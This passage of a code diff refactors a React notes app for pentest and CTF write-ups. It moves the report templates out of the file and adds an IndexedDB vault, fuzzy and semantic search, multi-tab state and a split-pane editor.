@@ -5,6 +5,7 @@ import {
   Award,
   Bot,
   BookOpen,
+  Brain,
   CalendarDays,
   ChartBar,
   Check,
@@ -16,6 +17,7 @@ import {
   Copy,
   Crosshair,
   Database,
+  Dices,
   Download,
   Eye,
   EyeOff,
@@ -48,12 +50,11 @@ import {
   Upload,
   User,
   Waypoints,
+  WifiOff,
   X,
   Flame,
 } from "lucide-react";
 import { ChangeEvent, useEffect, useMemo, useRef, useState } from "react";
-import DOMPurify from "dompurify";
-import { marked } from "marked";
 import { startLogin } from "@/const";
 import { useAuth } from "@/_core/hooks/useAuth";
 import { useTheme } from "@/contexts/ThemeContext";
@@ -69,6 +70,7 @@ import {
   TrackStats,
 } from "@/data/roadmapTracks";
 import { thmFreePathRooms, thmRoomUrl } from "@/data/thmFreePath";
+import { templateByKey } from "@/data/reportTemplates";
 import { filterReports, toggleReportStatus } from "@/lib/report-utils";
 import { trpc } from "@/lib/trpc";
 import { toast } from "sonner";
@@ -76,8 +78,36 @@ import AIChatBot from "@/components/AIChatBot";
 import DocumentDiagram from "@/components/DocumentDiagram";
 import KnowledgeAtlas from "@/components/KnowledgeAtlas";
 import InsightsDashboard from "@/components/InsightsDashboard";
+import BacklinksPanel from "@/components/BacklinksPanel";
+import ReportImage from "@/components/ReportImage";
+import ReportTabs from "@/components/ReportTabs";
+import { FilterChips, SnippetText, type FilterChip } from "@/components/SearchBits";
+import SplitEditor, { type SplitEditorPreset, type SplitEditorSaveData } from "@/components/SplitEditor";
+import WikiMarkdown from "@/components/WikiMarkdown";
 import PentestHub, { type PentestSubTab } from "@/components/pentest/PentestHub";
 import QuickPentestHUD from "@/components/pentest/QuickPentestHUD";
+import { allWikiEdges } from "@shared/wikiLinks";
+import {
+  bestSnippet,
+  hasActiveFilters,
+  matchesFilters,
+  parseSearchQuery,
+  rankFuzzy,
+} from "@shared/search";
+import {
+  docTextForEmbedding,
+  embedText,
+  hybridBlend,
+  semanticRank,
+} from "@shared/embeddings";
+import {
+  migrateLocalStorageToVault,
+  vaultAvailable,
+  vaultGetAll,
+  vaultSet,
+  vaultStatus,
+  type VaultBackend,
+} from "@/lib/vault";
 import {
   readTargets,
   saveTargets,
@@ -114,6 +144,8 @@ export type Report = {
   excerpt: string;
   content: string;
   image?: string;
+  /** IndexedDB blob id for >1.5 MB screenshots (local-only bytes). */
+  imageRef?: string;
   archived?: boolean;
   sourcePath?: string;
   category?: string;
@@ -336,86 +368,12 @@ const trackIcons: Record<string, typeof Compass> = {
   "oscp-cloud": Award,
 };
 
-const reportTemplates = [
-  {
-    key: "custom",
-    label: "Кибер талбарын тэмдэглэл",
-    source: "Cyber" as const,
-    stage: "Foundations",
-    tags: ["pentest-report", "reconnaissance", "evidence"],
-    content:
-      "# Penetration Test Report\n\n## 1. Executive Summary\n\n\n## 2. Scope and Authorization\n\n- Target / room:\n- Authorized scope:\n- Date and operator:\n\n## 3. Attack Surface and Reconnaissance\n\n### Assets and services\n\n### Commands and evidence\n\n```bash\n# Add only commands run in the authorized lab\n\n```\n\n## 4. Findings\n\n### Finding 01: [Title]\n\n- Severity: Informational / Low / Medium / High / Critical\n- Asset:\n- Evidence:\n- Impact:\n- Reproduction steps:\n\n## 5. Exploitation Path\n\n1. Initial access:\n2. Discovery:\n3. Privilege escalation or lateral movement:\n4. Proof / flag:\n\n## 6. Remediation\n\n## 7. Lessons Learned\n\n## 8. Appendix\n\n- Related playbooks:\n- Related reports:\n- Screenshots / hashes:\n",
-  },
-  {
-    key: "thm",
-    label: "THM room тайлан",
-    source: "THM" as const,
-    stage: "Foundations",
-    tags: ["tryhackme", "room-debrief"],
-    content:
-      "# TryHackMe Room Write-up\n\n## 1. Room Overview\n\n- Room:\n- Difficulty:\n- Objective:\n- Link:\n\n## 2. Enumeration\n\n### Services and attack surface\n\n### Commands\n\n```bash\n\n```\n\n## 3. Initial Access\n\n- Vulnerability / weakness:\n- Evidence:\n- Credentials or foothold:\n\n## 4. Privilege Escalation\n\n- Enumeration:\n- Path selected:\n- Proof:\n\n## 5. Flags and Evidence\n\n## 6. Root Cause and Remediation\n\n## 7. Lessons Learned\n\n## 8. Related Playbooks and Tags\n\n",
-  },
-  {
-    key: "picoctf",
-    label: "picoCTF challenge тайлан",
-    source: "picoCTF" as const,
-    stage: "Live Fire",
-    tags: ["picoctf", "challenge"],
-    content:
-      "## Challenge-ийн ангилал\n\nReverse engineering / Web exploitation шинжилгээ.\n\n## Flag олдсон арга\n\n",
-  },
-  {
-    key: "htb",
-    label: "HTB машин тайлан",
-    source: "HTB" as const,
-    stage: "Pro Arena",
-    tags: ["hackthebox", "machine"],
-    content:
-      "## Машины мэдээлэл\n\nАнхны хандалт (User shell) ба эрх ахиулалт (Root flag).\n\n## Эмзэг байдал\n\n",
-  },
-  {
-    key: "pentest-finding",
-    label: "🛡️ CVSS Эмзэг байдлын олдвор",
-    source: "Cyber" as const,
-    stage: "Live Fire",
-    tags: ["cvss-finding", "vulnerability", "high", "poc"],
-    content:
-      "# [Vulnerability Title]\n\n- **Үнэлгээ (Severity):** HIGH (CVSS:3.1 Base Score: 7.8)\n- **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`\n- **Зорилтот систем (Target):** `10.10.11.45:80`\n\n## 1. Эмзэг байдлын тодорхойлолт (Description)\n\n\n## 2. Үр дагавар (Impact)\n\n\n## 3. Баталгаажуулах алхмууд (Proof of Concept)\n\n```bash\n# Reproduce exploit\ncurl -X POST http://10.10.11.45/api/endpoint -d \"payload=...\"\n```\n\n## 4. Засварлах зөвлөмж (Remediation)\n\n",
-  },
-  {
-    key: "cloud",
-    label: "Cloud security довтолгооны төлөвлөгөө",
-    source: "Cloud" as const,
-    stage: "Deployment",
-    tags: ["cloud", "iam"],
-    content:
-      "## Клауд орчны бүтэц\n\nIAM, S3, болон дэд бүтцийн тохиргооны шалгалт.\n\n## Эрсдэлийн үнэлгээ\n\n",
-  },
-];
-
 function quickHash(value: string): number {
   let hash = 0;
   for (let i = 0; i < value.length; i++) {
     hash = (hash * 31 + value.charCodeAt(i)) | 0;
   }
   return hash;
-}
-
-function normalizeNoteMarkdown(md: string): string {
-  let out = String(md ?? "");
-  out = out
-    .split("\n")
-    .filter(line => !line.includes("ADD THIS TO YOUR OBSIDIAN VAULT"))
-    .join("\n");
-  out = out.replace(/^Tags:\s*.*$/gim, "");
-  out = out.replace(/^>\s*\[!note\]\s*/gim, "> ");
-  const lines = out.split("\n");
-  const quoteLines = lines.filter(l => l.trim().startsWith(">")).length;
-  if (lines.length > 0 && quoteLines / lines.length > 0.6) {
-    out = lines.map(l => l.replace(/^>\s?/, "")).join("\n");
-  }
-  out = out.replace(/==([^=]+)==/g, "**$1**");
-  return out;
 }
 
 function readReports(): Report[] {
@@ -483,7 +441,9 @@ function safeSetItem(key: string, value: string) {
 }
 
 function saveReports(reports: Report[]) {
-  safeSetItem("operator-dossier-reports", JSON.stringify(reports));
+  // IndexedDB is the source of truth (quota-safe); vaultSet also mirrors
+  // small vaults to localStorage for instant cold boot.
+  vaultSet("reports", reports);
 }
 
 function readTasks(): TaskItem[] {
@@ -496,7 +456,7 @@ function readTasks(): TaskItem[] {
 }
 
 function saveTasks(tasks: TaskItem[]) {
-  safeSetItem("operator-dossier-tasks", JSON.stringify(tasks));
+  vaultSet("tasks", tasks);
 }
 
 function readPlaybooks(): PlaybookItem[] {
@@ -520,7 +480,7 @@ function readPlaybooks(): PlaybookItem[] {
 }
 
 function savePlaybooks(playbooks: PlaybookItem[]) {
-  localStorage.setItem("operator-dossier-playbooks", JSON.stringify(playbooks));
+  vaultSet("playbooks", playbooks);
 }
 
 function readTrackProgress(): Record<string, boolean> {
@@ -550,7 +510,7 @@ function readTrackProgress(): Record<string, boolean> {
 }
 
 function saveTrackProgress(progress: Record<string, boolean>) {
-  safeSetItem("operator-dossier-track-progress", JSON.stringify(progress));
+  vaultSet("track-progress", progress);
 }
 
 function getWorkspaceKey() {
@@ -599,7 +559,19 @@ function initialPublicView(): boolean {
 }
 
 function reportToMarkdown(report: Report) {
-  return `---\ntitle: ${report.title}\nroom: ${report.room}\nsource: ${report.source}\nstage: ${report.stage}\ntags: [${report.tags.join(", ")}]\nstatus: ${report.status}\ndate: ${report.date}\n---\n\n# ${report.title}\n\n> ${report.excerpt}\n\n${report.content}\n`;
+  const imageNote =
+    !report.image && report.imageRef
+      ? "\n\n> Скриншот локал сан (IndexedDB)-д хадгалагдсан тул энэ экспортод ороогүй.\n"
+      : "";
+  return `---\ntitle: ${report.title}\nroom: ${report.room}\nsource: ${report.source}\nstage: ${report.stage}\ntags: [${report.tags.join(", ")}]\nstatus: ${report.status}\ndate: ${report.date}\n---\n\n# ${report.title}\n\n> ${report.excerpt}\n\n${report.content}${imageNote}\n`;
+}
+
+function formatBytes(value: number | null): string {
+  if (value === null || !Number.isFinite(value)) return "—";
+  if (value < 1024) return `${value} B`;
+  if (value < 1024 * 1024) return `${(value / 1024).toFixed(1)} KB`;
+  if (value < 1024 * 1024 * 1024) return `${(value / 1024 / 1024).toFixed(1)} MB`;
+  return `${(value / 1024 / 1024 / 1024).toFixed(2)} GB`;
 }
 
 function downloadText(
@@ -655,42 +627,6 @@ function parseObsidianMarkdown(
   };
 }
 
-function MarkdownPreview({ content }: { content: string }) {
-  const containerRef = useRef<HTMLDivElement>(null);
-
-  const html = useMemo(() => {
-    const raw = marked.parse(normalizeNoteMarkdown(content), { gfm: true, breaks: false, async: false });
-    return DOMPurify.sanitize(String(raw), { ADD_ATTR: ["target"] });
-  }, [content]);
-
-  useEffect(() => {
-    const root = containerRef.current;
-    if (!root) return;
-    root.querySelectorAll("pre").forEach(pre => {
-      if (pre.querySelector(".md-copy-btn")) return;
-      const btn = document.createElement("button");
-      btn.type = "button";
-      btn.className = "md-copy-btn";
-      btn.textContent = "Хуулах";
-      btn.addEventListener("click", () => {
-        const text = (pre.querySelector("code") ?? pre).textContent ?? "";
-        navigator.clipboard.writeText(text);
-        btn.textContent = "Хуулагдлаа!";
-        window.setTimeout(() => (btn.textContent = "Хуулах"), 1200);
-      });
-      pre.appendChild(btn);
-    });
-  }, [html]);
-
-  return (
-    <div
-      className="markdown-preview"
-      ref={containerRef}
-      dangerouslySetInnerHTML={{ __html: html }}
-    />
-  );
-}
-
 export default function Home() {
   const [activeNav, setActiveNav] = useState("Ерөнхий");
   const [reports, setReports] = useState<Report[]>(readReports);
@@ -733,7 +669,8 @@ export default function Home() {
   const [mobileNav, setMobileNav] = useState(false);
 
   const [editorOpen, setEditorOpen] = useState(false);
-  const [editingReportId, setEditingReportId] = useState<number | null>(null);
+  const [editorInit, setEditorInit] = useState<{ report: Report | null; preset?: SplitEditorPreset } | null>(null);
+  const [editorNonce, setEditorNonce] = useState(0);
   const [selectedPlaybook, setSelectedPlaybook] = useState<PlaybookItem | null>(null);
   const [playbookEditorOpen, setPlaybookEditorOpen] = useState(false);
   const [commandPaletteOpen, setCommandPaletteOpen] = useState(false);
@@ -743,16 +680,20 @@ export default function Home() {
   const [deleteConfirmId, setDeleteConfirmId] = useState<number | null>(null);
   const [optionsMenuOpen, setOptionsMenuOpen] = useState(false);
 
-  const [newTitle, setNewTitle] = useState("");
-  const [newRoom, setNewRoom] = useState("");
-  const [newStage, setNewStage] = useState("Foundations");
-  const [newSource, setNewSource] = useState<Report["source"]>("Cyber");
-  const [newTrackId, setNewTrackId] = useState("thm-free-path");
-  const [newTrackSectionId, setNewTrackSectionId] = useState("level-1");
-  const [newCoreTags, setNewCoreTags] = useState("");
-  const [templateKey, setTemplateKey] = useState("custom");
-  const [newContent, setNewContent] = useState("");
-  const [attachment, setAttachment] = useState<string | undefined>();
+  // Second Brain: multi-tab workspace, search 2.0, offline-first vault.
+  const [openTabs, setOpenTabs] = useState<number[]>([1]);
+  const [searchMode, setSearchMode] = useState<"fuzzy" | "semantic" | "hybrid">("fuzzy");
+  const [debouncedQuery, setDebouncedQuery] = useState("");
+  const [isOnline, setIsOnline] = useState(() =>
+    typeof navigator === "undefined" ? true : navigator.onLine
+  );
+  const [vaultInfo, setVaultInfo] = useState<{
+    backend: VaultBackend;
+    kvKeys: number;
+    images: number;
+    usageBytes: number | null;
+    quotaBytes: number | null;
+  } | null>(null);
 
   const [addingTaskGroup, setAddingTaskGroup] = useState<"today" | "tomorrow" | "later" | null>(null);
   const [newTaskTitle, setNewTaskTitle] = useState("");
@@ -801,11 +742,12 @@ export default function Home() {
     return false;
   }
 
-  const fileInput = useRef<HTMLInputElement>(null);
   const obsidianInput = useRef<HTMLInputElement>(null);
   const backupInput = useRef<HTMLInputElement>(null);
   const mongoHydrated = useRef(false);
   const workspaceSwitched = useRef(false);
+  const vaultHydrated = useRef(false);
+  const tabScroll = useRef(new Map<number, number>());
 
   const mongoReports = trpc.reports.list.useQuery(
     { workspaceKey },
@@ -814,6 +756,26 @@ export default function Home() {
   const mongoStatus = trpc.reports.status.useQuery(undefined, { retry: false });
   const persistReports = trpc.reports.sync.useMutation();
   const isCloudBackend = mongoStatus.data?.backend === "mongodb";
+
+  // Semantic search: local vectors always work offline; the server upgrades
+  // the ranking with OpenRouter embeddings when it reports them configured.
+  const semanticStatus = trpc.ai.semantic.status.useQuery({ workspaceKey }, { retry: false, staleTime: 60_000 });
+  const debouncedSemanticText = useMemo(
+    () => parseSearchQuery(debouncedQuery).text,
+    [debouncedQuery]
+  );
+  const cloudSemantic = trpc.ai.semantic.search.useQuery(
+    { workspaceKey, query: debouncedSemanticText.slice(0, 500), limit: 60 },
+    {
+      retry: false,
+      staleTime: 30_000,
+      enabled:
+        semanticStatus.data?.cloud.configured === true &&
+        searchMode !== "fuzzy" &&
+        debouncedSemanticText.trim().length > 1,
+    }
+  );
+  const refreshCloudVectorsMutation = trpc.ai.semantic.refresh.useMutation();
 
   const trpcUtils = trpc.useUtils();
   const insightsQuery = trpc.ai.insights.atlas.useQuery({ workspaceKey }, { retry: false, staleTime: 0 });
@@ -906,7 +868,7 @@ export default function Home() {
         ...localOnly,
       ];
       setReports(mergedReports);
-      setSelectedId(mergedReports[0]?.id || 1);
+      if (mergedReports[0]) openTab(mergedReports[0].id);
       const meta = readReportMeta(workspaceKey);
       let metaChanged = false;
       for (const row of remoteReports) {
@@ -1012,6 +974,82 @@ export default function Home() {
     } catch {}
   }, [activeTrackId]);
 
+  // Debounced query for the (network) cloud-semantic call — local fuzzy and
+  // local semantic rank on every keystroke without any debounce.
+  useEffect(() => {
+    const timer = window.setTimeout(() => setDebouncedQuery(query), 450);
+    return () => window.clearTimeout(timer);
+  }, [query]);
+
+  // Offline indicator for the topbar.
+  useEffect(() => {
+    const goOffline = () => setIsOnline(false);
+    const goOnline = () => setIsOnline(true);
+    window.addEventListener("offline", goOffline);
+    window.addEventListener("online", goOnline);
+    return () => {
+      window.removeEventListener("offline", goOffline);
+      window.removeEventListener("online", goOnline);
+    };
+  }, []);
+
+  // IndexedDB hydration: migrate legacy localStorage once, then adopt the
+  // vault snapshot when it differs from the synchronously booted state
+  // (this is what rescues big vaults whose localStorage mirror is missing).
+  useEffect(() => {
+    let cancelled = false;
+    (async () => {
+      if (!vaultAvailable() || vaultHydrated.current) return;
+      await migrateLocalStorageToVault();
+      const snap = await vaultGetAll();
+      if (cancelled || vaultHydrated.current) return;
+      vaultHydrated.current = true;
+      if (Array.isArray(snap.reports) && snap.reports.length > 0) {
+        const incoming = snap.reports as Report[];
+        setReports(current => {
+          if (quickHash(JSON.stringify(current)) === quickHash(JSON.stringify(incoming))) {
+            return current;
+          }
+          return incoming;
+        });
+      }
+      if (Array.isArray(snap.tasks)) setTasks(snap.tasks as TaskItem[]);
+      if (Array.isArray(snap.playbooks)) setPlaybooks(snap.playbooks as PlaybookItem[]);
+      if (snap["track-progress"] && typeof snap["track-progress"] === "object") {
+        setTrackProgress(snap["track-progress"] as Record<string, boolean>);
+      }
+      if (Array.isArray(snap.openTabs)) {
+        const tabs = (snap.openTabs as unknown[]).filter((t): t is number => typeof t === "number");
+        if (tabs.length) setOpenTabs(tabs.slice(0, 12));
+      }
+      if (typeof snap.selectedId === "number") setSelectedId(snap.selectedId);
+    })();
+    return () => {
+      cancelled = true;
+    };
+  }, []);
+
+  // Persist the tab workspace (debounced inside the vault layer).
+  useEffect(() => {
+    vaultSet("openTabs", openTabs);
+  }, [openTabs]);
+
+  useEffect(() => {
+    vaultSet("selectedId", selectedId);
+  }, [selectedId]);
+
+  // Storage diagnostics for the profile dialog (loaded on open).
+  useEffect(() => {
+    if (!profileOpen) return;
+    let cancelled = false;
+    vaultStatus().then(info => {
+      if (!cancelled) setVaultInfo(info);
+    });
+    return () => {
+      cancelled = true;
+    };
+  }, [profileOpen]);
+
   useEffect(() => {
     const handleKeyDown = (e: KeyboardEvent) => {
       if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") {
@@ -1057,41 +1095,204 @@ export default function Home() {
     [selectedTrackOption, visibleReports]
   );
 
-  const filteredReports = useMemo<Report[]>(() => {
-    let list: Report[] = visibleReports;
+  const parsedQuery = useMemo(() => parseSearchQuery(query), [query]);
+
+  // Local semantic vectors, rebuilt only when the visible vault changes —
+  // ranking itself stays per-keystroke cheap and fully offline.
+  const semanticVectors = useMemo(() => {
+    const map = new Map<number, readonly number[]>();
+    for (const r of visibleReports) {
+      try {
+        map.set(
+          r.id,
+          embedText(
+            docTextForEmbedding({
+              id: r.id,
+              title: r.title,
+              tags: r.tags,
+              excerpt: r.excerpt,
+              content: r.content,
+            })
+          )
+        );
+      } catch {
+        // A single bad document never breaks the whole index.
+      }
+    }
+    return map;
+  }, [visibleReports]);
+
+  const searchResult = useMemo(() => {
+    let base: Report[] = visibleReports;
     if (statusFilter === "Archived") {
-      list = list.filter(r => r.archived);
+      base = base.filter(r => r.archived);
     } else {
-      list = list.filter(r => !r.archived);
+      base = base.filter(r => !r.archived);
       if (statusFilter !== "All") {
-        list = list.filter(r => r.status === statusFilter);
+        base = base.filter(r => r.status === statusFilter);
       }
     }
     if (tagFilter !== "All") {
-      list = list.filter(r => r.tags.includes(tagFilter));
+      base = base.filter(r => r.tags.includes(tagFilter));
     }
     if (selectedTrackOption) {
-      list = list.filter(selectedTrackOption.match);
+      base = base.filter(selectedTrackOption.match);
     }
-    if (query.trim()) {
-      const q = query.trim().toLowerCase();
-      list = list.filter(
-        r =>
-          r.title.toLowerCase().includes(q) ||
-          r.room.toLowerCase().includes(q) ||
-          r.tags.some(t => t.toLowerCase().includes(q)) ||
-          r.content.toLowerCase().includes(q)
+    base = base.filter(r => matchesFilters(r, parsedQuery.filters));
+
+    const tokens = parsedQuery.tokens;
+    if (!tokens.length) {
+      const sorted = [...base].sort((a, b) => {
+        if (sortMode === "newest") return b.id - a.id;
+        if (sortMode === "oldest") return a.id - b.id;
+        if (sortMode === "title") return a.title.localeCompare(b.title);
+        if (sortMode === "readTime") return parseInt(a.readTime) - parseInt(b.readTime);
+        return 0;
+      });
+      return {
+        list: sorted,
+        scores: new Map<number, number>(),
+        searched: false,
+        provider: "none" as const,
+      };
+    }
+
+    const fuzzy = rankFuzzy(base, parsedQuery);
+
+    let semanticHits: { id: number; score: number }[] = [];
+    let provider: "local" | "openrouter+local" = "local";
+    if (searchMode !== "fuzzy") {
+      const docs = base.map(r => ({
+        id: r.id,
+        title: r.title,
+        tags: r.tags,
+        excerpt: r.excerpt,
+        content: r.content,
+      }));
+      semanticHits = semanticRank(parsedQuery.text, docs, semanticVectors);
+      // Cloud upgrade, applied only when the debounced server answer matches
+      // the exact query on screen (never stale results).
+      const cloud = cloudSemantic.data;
+      if (
+        cloud &&
+        cloud.hits.length > 0 &&
+        debouncedSemanticText.trim() === parsedQuery.text.trim()
+      ) {
+        const merged = new Map<number, number>();
+        for (const h of semanticHits) merged.set(h.id, h.score * 0.85);
+        for (const h of cloud.hits) {
+          merged.set(h.id, Math.max(merged.get(h.id) ?? 0, h.score));
+        }
+        semanticHits = [...merged.entries()]
+          .map(([id, score]) => ({ id, score }))
+          .sort((a, b) => b.score - a.score);
+        if (cloud.provider === "openrouter+local") provider = "openrouter+local";
+      }
+    }
+
+    let ordered: { id: number; score: number }[];
+    if (searchMode === "fuzzy") {
+      ordered = fuzzy.map(f => ({ id: f.report.id, score: f.score }));
+    } else if (searchMode === "semantic") {
+      ordered = semanticHits;
+    } else {
+      ordered = hybridBlend(
+        fuzzy.map(f => ({ id: f.report.id, score: f.score })),
+        semanticHits
       );
     }
 
-    return [...list].sort((a, b) => {
-      if (sortMode === "newest") return b.id - a.id;
-      if (sortMode === "oldest") return a.id - b.id;
-      if (sortMode === "title") return a.title.localeCompare(b.title);
-      if (sortMode === "readTime") return parseInt(a.readTime) - parseInt(b.readTime);
-      return 0;
-    });
-  }, [visibleReports, statusFilter, tagFilter, trackFilter, selectedTrackOption, query, sortMode]);
+    const byId = new Map(base.map(r => [r.id, r]));
+    const list: Report[] = [];
+    const scores = new Map<number, number>();
+    for (const hit of ordered) {
+      const report = byId.get(hit.id);
+      if (report) {
+        list.push(report);
+        scores.set(hit.id, hit.score);
+      }
+    }
+    return { list, scores, searched: true, provider };
+  }, [
+    visibleReports,
+    statusFilter,
+    tagFilter,
+    selectedTrackOption,
+    parsedQuery,
+    searchMode,
+    sortMode,
+    semanticVectors,
+    cloudSemantic.data,
+    debouncedSemanticText,
+  ]);
+
+  const filteredReports = searchResult.list;
+  const searchScores = searchResult.scores;
+  const searchActive = searchResult.searched;
+  const semanticProvider = searchResult.provider;
+
+  // Highlighted snippets for the visible hits only.
+  const searchSnippets = useMemo(() => {
+    const map = new Map<
+      number,
+      { text: string; ranges: { start: number; end: number }[]; field: string }
+    >();
+    if (!searchActive) return map;
+    for (const r of filteredReports) {
+      map.set(r.id, bestSnippet(r, parsedQuery.tokens));
+    }
+    return map;
+  }, [searchActive, filteredReports, parsedQuery]);
+
+  const tabTitles = useMemo(
+    () => new Map(visibleReports.map(r => [r.id, { title: r.title, status: r.status }])),
+    [visibleReports]
+  );
+  const validTabs = useMemo(
+    () => openTabs.filter(id => tabTitles.has(id)),
+    [openTabs, tabTitles]
+  );
+
+  // Atlas: AI/tag relations ∪ explicit [[wiki-link]] edges.
+  const atlasInsights = useMemo(() => {
+    const edges = allWikiEdges(visibleReports);
+    const wikiRelations = edges.map(e => ({
+      source: e.from,
+      target: e.to,
+      weight: 1,
+      reason: `[[${e.alias}]] холбоос`,
+    }));
+    const base = insightsQuery.data;
+    if (!base) {
+      if (!wikiRelations.length) return null;
+      return {
+        snapshot: {
+          provider: "local" as const,
+          model: "wiki-links",
+          analyzed: 0,
+          total: visibleReports.length,
+          computedAt: new Date().toISOString(),
+        },
+        insights: [],
+        relations: wikiRelations,
+      };
+    }
+    if (!wikiRelations.length) return base;
+    const seen = new Set(
+      base.relations.map(r => `${Math.min(r.source, r.target)}-${Math.max(r.source, r.target)}`)
+    );
+    const merged = [...base.relations];
+    for (const w of wikiRelations) {
+      const key = `${Math.min(w.source, w.target)}-${Math.max(w.source, w.target)}`;
+      if (!seen.has(key)) {
+        seen.add(key);
+        merged.push(w);
+      }
+    }
+    return { ...base, relations: merged };
+  }, [insightsQuery.data, visibleReports]);
+
+  const wikiEdgeCount = useMemo(() => allWikiEdges(visibleReports).length, [visibleReports]);
 
   const selectedReport =
     visibleReports.find(report => report.id === selectedId) || visibleReports[0];
@@ -1169,8 +1370,41 @@ export default function Home() {
     });
   }, [insightsQuery.data, selectedReport, visibleReports]);
 
-  function openReportInReader(reportId: number) {
+  // --- Multi-tab workspace (scroll position preserved per tab) ---
+  function activateTab(reportId: number) {
+    if (reportId === selectedId) {
+      window.scrollTo(0, tabScroll.current.get(reportId) ?? 0);
+      return;
+    }
+    tabScroll.current.set(selectedId, window.scrollY);
     setSelectedId(reportId);
+    const y = tabScroll.current.get(reportId) ?? 0;
+    requestAnimationFrame(() => window.scrollTo(0, y));
+  }
+
+  function openTab(reportId: number) {
+    setOpenTabs(current => {
+      if (current.includes(reportId)) return current;
+      const next = [...current, reportId];
+      return next.length > 12 ? next.slice(next.length - 12) : next;
+    });
+    activateTab(reportId);
+  }
+
+  function closeTab(reportId: number) {
+    const next = openTabs.filter(id => id !== reportId);
+    tabScroll.current.delete(reportId);
+    setOpenTabs(next);
+    if (reportId === selectedId && next.length > 0) {
+      const idx = openTabs.indexOf(reportId);
+      const neighbor = next[Math.min(idx, next.length - 1)];
+      setSelectedId(neighbor);
+      requestAnimationFrame(() => window.scrollTo(0, tabScroll.current.get(neighbor) ?? 0));
+    }
+  }
+
+  function openReportInReader(reportId: number) {
+    openTab(reportId);
     setActiveNav("Тайлан-уншилт");
   }
 
@@ -1212,37 +1446,17 @@ export default function Home() {
     );
   }
 
-  function openNewReportEditor() {
+  // --- Split-pane editor ---
+  function launchEditor(report: Report | null, preset?: SplitEditorPreset) {
     if (guardPublicMode()) return;
-    setEditingReportId(null);
-    setNewTitle("");
-    setNewRoom("");
-    setNewStage("Foundations");
-    setNewSource("Cyber");
-    setNewTrackId("thm-free-path");
-    setNewTrackSectionId("level-1");
-    setNewCoreTags("");
-    setTemplateKey("custom");
-    setNewContent(reportTemplates[0].content);
-    setAttachment(undefined);
+    setEditorInit({ report, preset });
+    setEditorNonce(n => n + 1);
     setEditorOpen(true);
+    setOptionsMenuOpen(false);
   }
 
-  function openRoomReportEditor(room: (typeof thmFreePathRooms)[number]) {
-    setEditingReportId(null);
-    setNewTitle(`${room.title} - room notes`);
-    setNewRoom(`THM / ${room.title}`);
-    setNewStage("Foundations");
-    setNewSource("THM");
-    setNewTrackId("thm-free-path");
-    setNewTrackSectionId(room.levelId);
-    setNewCoreTags("room-notes");
-    setTemplateKey("thm");
-    setNewContent(
-      `## Room-ийн зорилго\n\n${room.title}\n\n## THM холбоос\n\n${thmRoomUrl(room.slug)}\n\n## Олсон зүйлс\n\n\n## Ашигласан техникүүд\n\n\n## Дүгнэлт\n\n`
-    );
-    setAttachment(undefined);
-    setEditorOpen(true);
+  function openNewReportEditor() {
+    launchEditor(null);
   }
 
   function toggleTrackItem(trackId: string, itemId: string) {
@@ -1251,141 +1465,144 @@ export default function Home() {
     setTrackProgress(current => ({ ...current, [key]: !current[key] }));
   }
 
-  function openEditReport(report: Report) {
+  function openRoomReportEditor(room: (typeof thmFreePathRooms)[number]) {
     if (guardPublicMode()) return;
-    setEditingReportId(report.id);
-    setNewTitle(report.title);
-    setNewRoom(report.room);
-    setNewStage(report.stage);
-    setNewSource(report.source);
-    const matchingTrack = reportTrackOptions.find(option => option.match(report));
-    setNewTrackId(matchingTrack?.id ?? "thm-free-path");
-    setNewTrackSectionId("level-1");
-    setNewCoreTags(report.tags.filter(tag => !tag.startsWith("roadmap-") && !tag.startsWith("section-")).join(", "));
-    setTemplateKey("custom");
-    setNewContent(report.content);
-    setAttachment(report.image);
-    setEditorOpen(true);
-    setOptionsMenuOpen(false);
+    launchEditor(null, {
+      title: `${room.title} - room notes`,
+      room: `THM / ${room.title}`,
+      source: "THM",
+      stage: "Foundations",
+      trackId: "thm-free-path",
+      sectionId: room.levelId,
+      coreTags: "room-notes",
+      templateKey: "thm",
+      content:
+        `## Room-ийн зорилго\n\n${room.title}\n\n## THM холбоос\n\n${thmRoomUrl(room.slug)}\n\n## Олсон зүйлс\n\n\n## Ашигласан техникүүд\n\n\n## Дүгнэлт\n\n`,
+    });
   }
 
-  function applyTemplate(key: string) {
-    const template =
-      reportTemplates.find(item => item.key === key) || reportTemplates[0];
-    setTemplateKey(template.key);
-    setNewSource(template.source);
-    setNewStage(template.stage);
-    setNewContent(template.content);
+  function openEditReport(report: Report) {
+    launchEditor(report);
   }
 
-  function selectedEditorTrack() {
-    return roadmapTracks.find(track => track.id === newTrackId) ?? roadmapTracks[0];
+  /** Unresolved `[[Title]]` click → create that note pre-titled. */
+  function openCreateReportForTitle(title: string) {
+    const clean = title.trim().slice(0, 200);
+    if (!clean) return;
+    launchEditor(null, { title: clean, templateKey: "custom" });
+    toast.info(`«${clean}» — шинэ тэмдэглэл үүсгэж байна`);
   }
 
-  function applyTrackDefaults(trackId: string) {
-    setNewTrackId(trackId);
-    const track = roadmapTracks.find(item => item.id === trackId) ?? roadmapTracks[0];
-    setNewTrackSectionId(track.sections[0]?.id ?? "");
-    if (trackId === "thm-free-path" || trackId === "thm-paid-ad") setNewSource("THM");
-    else if (trackId === "pico-ctf-cylab") setNewSource("picoCTF");
-    else if (trackId === "htb-flaws") setNewSource("HTB");
-    else if (trackId === "oscp-cloud") setNewSource("Cloud");
-  }
-
-  function handleAttachment(event: ChangeEvent<HTMLInputElement>) {
-    const file = event.target.files?.[0];
-    event.target.value = "";
-    if (!file) return;
-    const MAX_ATTACHMENT_BYTES = 1.5 * 1024 * 1024;
-    if (!file.type.startsWith("image/")) {
-      toast.error("Зөвхөн зургын файл (PNG / JPG / WEBP) сонгоно уу");
-      return;
-    }
-    if (file.size > MAX_ATTACHMENT_BYTES) {
-      toast.error(
-        `Скриншот хэт том (max 1.5 MB, сонгосон ${Math.round(file.size / 1024 / 102.4) / 10} MB)`
-      );
-      return;
-    }
-    const reader = new FileReader();
-    reader.onload = () => {
-      setAttachment(String(reader.result));
-      toast.success("Скриншот хавсаргагдлаа");
-    };
-    reader.readAsDataURL(file);
-  }
-
-  function saveReport() {
-    if (!newTitle.trim()) {
-      toast.error("Тайлангийн гарчиг оруулна уу!");
-      return;
-    }
-    const wordCount = newContent.split(/\s+/).filter(Boolean).length;
+  function saveEditorReport(data: SplitEditorSaveData) {
+    const wordCount = data.content.split(/\s+/).filter(Boolean).length;
     const est = Math.max(1, Math.round(wordCount / 150));
     const calculatedReadTime = `${est < 10 ? "0" : ""}${est} min`;
